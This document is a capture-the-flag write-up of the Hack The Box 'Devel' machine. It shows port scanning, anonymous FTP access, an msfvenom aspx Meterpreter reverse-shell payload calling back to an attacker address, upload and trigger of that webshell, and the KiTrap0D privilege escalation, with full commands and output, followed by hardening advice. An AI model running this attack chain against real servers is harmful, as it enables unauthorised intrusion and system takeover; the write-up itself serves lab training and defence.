---
icon: brackets-curly
---

# HTB-DEVEL

<figure><img src="../../../../.gitbook/assets/image (322).png" alt=""><figcaption></figcaption></figure>

### ENUMERATION

```perl
┌──(sn0x㉿sn0x)-[~/HTB/Devel]
└─$ rustscan -a 10.10.10.5 --ulimit 5000 --range 1-65000 -- -sCV -Pn
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \\ |  `| |
| .-. \\| {_} |.-._} } | |  .-._} }\\     }/  /\\  \\| |\\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: <https://discord.gg/GFrQsGy>           :
: <https://github.com/RustScan/RustScan> :
 --------------------------------------
Real hackers hack time ⌛

[~] The config file is expected to be at "/home/sn0x/.rustscan.toml"
[~] Automatically increasing ulimit value to 5000.
Open 10.10.10.5:21
Open 10.10.10.5:80
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.

Scanning 10.10.10.5 [2 ports]
Discovered open port 21/tcp on 10.10.10.5
Discovered open port 80/tcp on 10.10.10.5

PORT   STATE SERVICE REASON          VERSION
21/tcp open  ftp     syn-ack ttl 127 Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 03-18-17  02:06AM       <DIR>          aspnet_client
| 03-17-17  05:37PM                  689 iisstart.htm
|_03-17-17  05:37PM               184946 welcome.png
| ftp-syst: 
|_  SYST: Windows_NT
80/tcp open  http    syn-ack ttl 127 Microsoft IIS httpd 7.5
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/7.5
|_http-title: IIS7
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 16:11
Completed NSE at 16:11, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 16:11
Completed NSE at 16:11, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 16:11
Completed NSE at 16:11, 0.01s elapsed
Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at <https://nmap.org/submit/> .
Nmap done: 1 IP address (1 host up) scanned in 25.92 seconds
           Raw packets sent: 2 (88B) | Rcvd: 2 (88B)

```

### Anonymous FTP login allowed

```perl
┌──(sn0x㉿sn0x)-[~/HTB/Devel]
└─$ ftp 10.10.10.5  
Connected to 10.10.10.5.
220 Microsoft FTP Service
Name (10.10.10.5:sn0x): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password: 
230 User logged in.
Remote system type is Windows_NT.
ftp> dir
229 Entering Extended Passive Mode (|||49158|)
125 Data connection already open; Transfer starting.
03-18-17  02:06AM       <DIR>          aspnet_client
03-17-17  05:37PM                  689 iisstart.htm
03-17-17  05:37PM               184946 welcome.png
226 Transfer complete.
ftp> mget *
mget iisstart.htm [anpqy?]? y
229 Entering Extended Passive Mode (|||49164|)
125 Data connection already open; Transfer starting.
100% |****************************************************************************************************************|   689        2.93 KiB/s    00:00 ETA
226 Transfer complete.
689 bytes received in 00:00 (2.92 KiB/s)
mget welcome.png [anpqy?]? y
229 Entering Extended Passive Mode (|||49165|)
125 Data connection already open; Transfer starting.
  0% |                                                                                                                |  1350        1.31 KiB/s    02:16 ETAftp: Reading from network: Interrupted system call
  0% |                                                                                                                |    -1        0.00 KiB/s    --:-- ETA
550 The specified network name is no longer available. 
WARNING! 5 bare linefeeds received in ASCII mode.
File may not have transferred correctly.
```

#### Web Root Analysis & Bypassing Gobuster

At this point, I could run `gobuster` to enumerate potential paths on the web server. However, given my theory that the **FTP share directly maps to the web root**, I decided to skip brute-forcing in favor of targeting the exposed FTP service.

To validate this theory, I checked the two files obtained via FTP—`iisstart.htm` and `welcome.png`—by loading them in a browser. Both were accessible via HTTP:

* `http://10.10.10.5/iisstart.htm` returns the same default IIS page as the root URL.
* `welcome.png` is the image displayed on that page, confirming the file structure is shared between FTP and HTTP.

I also inspected the HTTP response in Burp Suite and noted the following headers:

```python
HTTP/1.1 200 OK
Content-Type: text/html
Last-Modified: Fri, 17 Mar 2017 14:37:30 GMT
Accept-Ranges: bytes
ETag: "37b5ed12c9fd21:0"
Server: Microsoft-IIS/7.5
X-Powered-By: ASP.NET
Date: Mon, 25 Feb 2019 10:40:02 GMT
Connection: close
Content-Length: 689

```

The presence of `X-Powered-By: ASP.NET` and `Microsoft-IIS/7.5` confirms that the server is running [ASP.NET](http://asp.net), which means I’ll likely need a **`.aspx` webshell** once I gain code execution.

***

### METASPLOIT :

#### Step 1 : Lets make .aspx file

```python
┌──(sn0x㉿sn0x)-[~/HTB/Devel]
└─$ msfvenom -p windows/meterpreter/reverse_tcp -f aspx -o devel.aspx LHOST=10.10.14.5 LPORT=4444

[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 354 bytes
Final size of aspx file: 2878 bytes
Saved as: devel.aspx

```

#### Step 2 : Upload file to FTP target server

```python
┌──(sn0x㉿sn0x)-[~/HTB/Devel]
└─$ ftp 10.10.10.5  
Connected to 10.10.10.5.
220 Microsoft FTP Service
Name (10.10.10.5:sn0x): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password: 
230 User logged in.
Remote system type is Windows_NT.
ftp> put devel.aspx
local: devel.aspx remote: devel.aspx
229 Entering Extended Passive Mode (|||49157|)
125 Data connection already open; Transfer starting.
100% |****************************************************************************************************************|  2918       71.35 MiB/s    --:-- ETA
226 Transfer complete.
2918 bytes sent in 00:00 (3.91 KiB/s)
ftp> bye
221 Goodbye.
```

#### Step 3 : lets take Meterpreter session and trigger [`http://10.10.10.5/devel.aspx`](http://10.10.10.5/devel.aspx)

```python
msf6 > use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set lhost 10.10.14.5
lhost => 10.10.14.5
msf6 exploit(multi/handler) > set lport 4444
lport => 4444
msf6 exploit(multi/handler) > run
[*] Started reverse TCP handler on 10.10.14.5:4444 
[*] Sending stage (177734 bytes) to 10.10.10.5
[*] Sending stage (177734 bytes) to 10.10.10.5
[*] Meterpreter session 1 opened (10.10.14.5:4444 -> 10.10.10.5:49158) at 2025-08-02 14:55:24 +0000

meterpreter > sysinfo
Computer        : DEVEL
OS              : Windows 7 (6.1 Build 7600).
Architecture    : x86
System Language : el_GR
Domain          : HTB
Logged On Users : 1
Meterpreter     : x86/windows
meterpreter >
```

No user Flag but i got one user name babis this might intresting for us

```python
meterpreter > cd /
meterpreter > ls
Listing: c:\\
============

Mode              Size   Type  Last modified              Name
----              ----   ----  -------------              ----
040777/rwxrwxrwx  0      dir   2017-03-17 23:16:46 +0000  $Recycle.Bin
040777/rwxrwxrwx  0      dir   2009-07-14 04:53:55 +0000  Documents and Settings
040777/rwxrwxrwx  0      dir   2009-07-14 02:37:05 +0000  PerfLogs
040555/r-xr-xr-x  4096   dir   2020-12-12 22:59:39 +0000  Program Files
040777/rwxrwxrwx  4096   dir   2017-12-27 23:49:02 +0000  ProgramData
040777/rwxrwxrwx  0      dir   2022-02-11 13:52:06 +0000  Recovery
040777/rwxrwxrwx  8192   dir   2024-01-24 09:45:47 +0000  System Volume Information
040555/r-xr-xr-x  4096   dir   2017-03-17 23:16:43 +0000  Users
040777/rwxrwxrwx  16384  dir   2022-02-11 14:03:32 +0000  Windows
100777/rwxrwxrwx  24     fil   2009-06-10 21:42:20 +0000  autoexec.bat
100666/rw-rw-rw-  10     fil   2009-06-10 21:42:20 +0000  config.sys
040777/rwxrwxrwx  4096   dir   2017-03-17 16:33:37 +0000  inetpub
000000/---------  0      fif   1970-01-01 00:00:00 +0000  pagefile.sys

meterpreter > cd Users
meterpreter > ls
Listing: c:\\Users
=================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
040777/rwxrwxrwx  8192  dir   2017-03-17 23:16:53 +0000  Administrator
040777/rwxrwxrwx  0     dir   2009-07-14 04:53:55 +0000  All Users
040777/rwxrwxrwx  8192  dir   2017-03-17 23:06:26 +0000  Classic .NET AppPool
040555/r-xr-xr-x  8192  dir   2009-07-14 07:14:28 +0000  Default
040777/rwxrwxrwx  0     dir   2009-07-14 04:53:55 +0000  Default User
040555/r-xr-xr-x  4096  dir   2009-07-14 07:20:18 +0000  Public
040777/rwxrwxrwx  8192  dir   2017-03-17 14:17:52 +0000  babis
100666/rw-rw-rw-  174   fil   2009-07-14 04:41:57 +0000  desktop.ini

meterpreter > cd babis
[-] stdapi_fs_chdir: Operation failed: Access is denied.
meterpreter >
```

#### C. Directory Navigation

*   Attempt to access potential flag locations:

    ```bash
    cd C:\\Users\\babis
    cd C:\\Users\\Administrator
    ```

_Access Denied_ on both.

### Privilege Escalation

Put the current session in the background and Use Local Exploit Suggester:

```python
meterpreter > background
[*] Backgrounding session 1...
msf6 exploit(multi/handler) > use post/multi/recon/local_exploit_suggester
msf6 post(multi/recon/local_exploit_suggester) > set SESSION 1
SESSION => 1
msf6 post(multi/recon/local_exploit_suggester) > run
[*] 10.10.10.5 - Collecting local exploits for x86/windows...
/usr/share/metasploit-framework/modules/exploits/linux/local/sock_sendpage.rb:47: warning: key "Notes" is duplicated and overwritten on line 68
/usr/share/metasploit-framework/modules/exploits/unix/webapp/phpbb_highlight.rb:46: warning: key "Notes" is duplicated and overwritten on line 51
/usr/share/metasploit-framework/vendor/bundle/ruby/3.3.0/gems/logging-2.4.0/lib/logging.rb:10: warning: /usr/lib/x86_64-linux-gnu/ruby/3.3.0/syslog.so was loaded from the standard library, but will no longer be part of the default gems starting from Ruby 3.4.0.
You can add syslog to your Gemfile or gemspec to silence this warning.
Also please contact the author of logging-2.4.0 to request adding syslog into its gemspec.
[*] 10.10.10.5 - 205 exploit checks are being tried...
[+] 10.10.10.5 - exploit/windows/local/bypassuac_comhijack: The target appears to be vulnerable.
[+] 10.10.10.5 - exploit/windows/local/bypassuac_eventvwr: The target appears to be vulnerable.
[+] 10.10.10.5 - exploit/windows/local/cve_2020_0787_bits_arbitrary_file_move: The service is running, but could not be validated. Vulnerable Windows 7/Windows Server 2008 R2 build detected!
[+] 10.10.10.5 - exploit/windows/local/ms10_015_kitrap0d: The service is running, but could not be validated.
[+] 10.10.10.5 - exploit/windows/local/ms10_092_schelevator: The service is running, but could not be validated.
[+] 10.10.10.5 - exploit/windows/local/ms13_053_schlamperei: The target appears to be vulnerable.
[+] 10.10.10.5 - exploit/windows/local/ms13_081_track_popup_menu: The target appears to be vulnerable.
[+] 10.10.10.5 - exploit/windows/local/ms14_058_track_popup_menu: The target appears to be vulnerable.
[+] 10.10.10.5 - exploit/windows/local/ms15_004_tswbproxy: The service is running, but could not be validated.
[+] 10.10.10.5 - exploit/windows/local/ms15_051_client_copy_image: The target appears to be vulnerable.
[+] 10.10.10.5 - exploit/windows/local/ms16_016_webdav: The service is running, but could not be validated.
[+] 10.10.10.5 - exploit/windows/local/ms16_032_secondary_logon_handle_privesc: The service is running, but could not be validated.
[+] 10.10.10.5 - exploit/windows/local/ms16_075_reflection: The target appears to be vulnerable.
[+] 10.10.10.5 - exploit/windows/local/ms16_075_reflection_juicy: The target appears to be vulnerable.
[+] 10.10.10.5 - exploit/windows/local/ntusermndragover: The target appears to be vulnerable.
[+] 10.10.10.5 - exploit/windows/local/ppr_flatten_rec: The target appears to be vulnerable.
[*] Running check method for exploit 42 / 42
[*] 10.10.10.5 - Valid modules for session 1:
============================

 #   Name                                                           Potentially Vulnerable?  Check Result
 -   ----                                                           -----------------------  ------------
 1   exploit/windows/local/bypassuac_comhijack                      Yes                      The target appears to be vulnerable.
 2   exploit/windows/local/bypassuac_eventvwr                       Yes                      The target appears to be vulnerable.
 3   exploit/windows/local/cve_2020_0787_bits_arbitrary_file_move   Yes                      The service is running, but could not be validated. Vulnerable Windows 7/Windows Server 2008 R2 build detected!                                                                                                              
 4   exploit/windows/local/ms10_015_kitrap0d                        Yes                      The service is running, but could not be validated.
 5   exploit/windows/local/ms10_092_schelevator                     Yes                      The service is running, but could not be validated.
 6   exploit/windows/local/ms13_053_schlamperei                     Yes                      The target appears to be vulnerable.
 7   exploit/windows/local/ms13_081_track_popup_menu                Yes                      The target appears to be vulnerable.
 8   exploit/windows/local/ms14_058_track_popup_menu                Yes                      The target appears to be vulnerable.
 9   exploit/windows/local/ms15_004_tswbproxy                       Yes                      The service is running, but could not be validated.
 10  exploit/windows/local/ms15_051_client_copy_image               Yes                      The target appears to be vulnerable.
 11  exploit/windows/local/ms16_016_webdav                          Yes                      The service is running, but could not be validated.
 12  exploit/windows/local/ms16_032_secondary_logon_handle_privesc  Yes                      The service is running, but could not be validated.
 13  exploit/windows/local/ms16_075_reflection                      Yes                      The target appears to be vulnerable.
 14  exploit/windows/local/ms16_075_reflection_juicy                Yes                      The target appears to be vulnerable.
 15  exploit/windows/local/ntusermndragover                         Yes                      The target appears to be vulnerable.
 16  exploit/windows/local/ppr_flatten_rec                          Yes                      The target appears to be vulnerable.
 17  exploit/windows/local/adobe_sandbox_adobecollabsync            No                       Cannot reliably check exploitability.
 18  exploit/windows/local/agnitum_outpost_acs                      No                       The target is not exploitable.
 19  exploit/windows/local/always_install_elevated                  No                       The target is not exploitable.
 20  exploit/windows/local/anyconnect_lpe                           No                       The target is not exploitable. vpndownloader.exe not found on file system                                                                                                                                                    
 21  exploit/windows/local/bits_ntlm_token_impersonation            No                       The target is not exploitable.

```

This module checks for potential local exploits based on the system architecture and OS info.

#### Trying Exploits

#### `bypassuac_eventvwr`

* Fails due to low privileges (IIS user not part of Admins)

#### `ms10_015_kitrap0d` – **KiTrap0D Exploit**

```python
msf6 post(multi/recon/local_exploit_suggester) > use exploit/windows/local/ms10_015_kitrap0d
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
msf6 exploit(windows/local/ms10_015_kitrap0d) > set SESSION 1
SESSION => 1
msf6 exploit(windows/local/ms10_015_kitrap0d) > set LHOST 10.10.14.5
LHOST => 10.10.14.5
msf6 exploit(windows/local/ms10_015_kitrap0d) > set LPORT 4444
LPORT => 4444
msf6 exploit(windows/local/ms10_015_kitrap0d) > run
[*] Started reverse TCP handler on 10.10.14.5:4444 
[*] Reflectively injecting payload and triggering the bug...
[*] Launching netsh to host the DLL...
[+] Process 3996 launched.
[*] Reflectively injecting the DLL into 3996...
[+] Exploit finished, wait for (hopefully privileged) payload execution to complete.
[*] Sending stage (177734 bytes) to 10.10.10.5
[*] Meterpreter session 2 opened (10.10.14.5:4444 -> 10.10.10.5:49160) at 2025-08-02 15:09:34 +0000

meterpreter > cd C:\\

```

Got Shell !!

#### Navigate to the flags

**Found**: `user.txt.txt`

```python
meterpreter > cd C:\\
 > cd Users
[-] stdapi_fs_chdir: Operation failed: The system cannot find the file specified.
meterpreter > cd babis
meterpreter > cd Desktop
meterpreter > ls
Listing: c:\\Users\\babis\\Desktop
===============================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
100666/rw-rw-rw-  282   fil   2017-03-17 14:17:51 +0000  desktop.ini
100444/r--r--r--  34    fil   2025-08-02 14:51:27 +0000  user.txt

meterpreter > cat user.txt
b9add07f229ef204827ac4137d9dfc1a

```

**Found**: `root.txt`

```python
meterpreter > cd ./../../../../../
meterpreter > ls
Listing: c:\\
============

Mode              Size   Type  Last modified              Name
----              ----   ----  -------------              ----
040777/rwxrwxrwx  0      dir   2017-03-17 23:16:46 +0000  $Recycle.Bin
040777/rwxrwxrwx  0      dir   2009-07-14 04:53:55 +0000  Documents and Settings
040777/rwxrwxrwx  0      dir   2009-07-14 02:37:05 +0000  PerfLogs
040555/r-xr-xr-x  4096   dir   2020-12-12 22:59:39 +0000  Program Files
040777/rwxrwxrwx  4096   dir   2017-12-27 23:49:02 +0000  ProgramData
040777/rwxrwxrwx  0      dir   2022-02-11 13:52:06 +0000  Recovery
040777/rwxrwxrwx  8192   dir   2024-01-24 09:45:47 +0000  System Volume Information
040555/r-xr-xr-x  4096   dir   2017-03-17 23:16:43 +0000  Users
040777/rwxrwxrwx  16384  dir   2022-02-11 14:03:32 +0000  Windows
100777/rwxrwxrwx  24     fil   2009-06-10 21:42:20 +0000  autoexec.bat
100666/rw-rw-rw-  10     fil   2009-06-10 21:42:20 +0000  config.sys
040777/rwxrwxrwx  4096   dir   2017-03-17 16:33:37 +0000  inetpub
000000/---------  0      fif   1970-01-01 00:00:00 +0000  pagefile.sys

meterpreter > cd Users
meterpreter > ls
Listing: c:\\Users
=================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
040777/rwxrwxrwx  8192  dir   2017-03-17 23:16:53 +0000  Administrator
040777/rwxrwxrwx  0     dir   2009-07-14 04:53:55 +0000  All Users
040777/rwxrwxrwx  8192  dir   2017-03-17 23:06:26 +0000  Classic .NET AppPool
040555/r-xr-xr-x  8192  dir   2009-07-14 07:14:28 +0000  Default
040777/rwxrwxrwx  0     dir   2009-07-14 04:53:55 +0000  Default User
040555/r-xr-xr-x  4096  dir   2009-07-14 07:20:18 +0000  Public
040777/rwxrwxrwx  8192  dir   2017-03-17 14:17:52 +0000  babis
100666/rw-rw-rw-  174   fil   2009-07-14 04:41:57 +0000  desktop.ini

meterpreter > cd Administrator
meterpreter > cd Desktop 
meterpreter > cat root.txt
e18f2439250ca77dec3f8dade0feb287

```

### **How to Secure Against This Attack**

Now let’s talk **defensive hardening** – how to prevent everything you just did as an attacker.

***

#### **A. Patch Management**

* Always install latest **Windows Updates & Hotfixes**
  * This machine was vulnerable to **MS10-015 (KiTrap0D)** which is over a decade old.
  * Use tools like **WSUS**, **ManageEngine**, or **SCCM** to manage patches.

***

#### **B. Least Privilege Enforcement**

* Never allow **IIS users or web users** to have write access to web directories like `C:\\inetpub\\wwwroot`.
* Use **App Pools with low-priv users** (i.e., ApplicationPoolIdentity).
* Disable or restrict `Everyone`, `Authenticated Users`, or `IUSR` from having NTFS write perms.

***

#### **C. Web Server Hardening**

*   Remove write access from:

    ```

    C:\\inetpub\\wwwroot\\

    ```
* Validate file uploads (block .aspx, .php, .exe extensions)
* Use a WAF (Web Application Firewall) like **ModSecurity**.

***

#### **D. Disable Dangerous Features**

* Disable **unused services** like:
  * File Sharing
  * Remote Registry
  * SMBv1
* Turn off **anonymous access** for IIS if not needed.

***

#### **E. User Access & Credential Management**

* Rotate all credentials post-breach.
* Enforce:
  * **Strong password policies**
  * **Account lockout policies**
*   Enable **LSASS protection** to prevent `mimikatz`style dumping:

    ```
    HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Lsa
    Value: RunAsPPL → DWORD: 1

    ```

***

#### **F. Logging & Monitoring**

* Enable Windows Event Logging (Sysmon + Winlogbeat → SIEM)
* Monitor:
  * Privilege escalation attempts
  * New user creation
  * Suspicious PowerShell or Command Prompt behavior
* Tools:
  * **Sysmon**, **ELK**, **Wazuh**, **CrowdStrike Falcon**

***

#### **G. Network Segmentation**

* Keep web servers in **DMZs**.
* Isolate backend databases and internal networks.
* Disable direct outbound internet access from internal servers unless needed.

<figure><img src="../../../../.gitbook/assets/complete (11).gif" alt=""><figcaption></figcaption></figure>
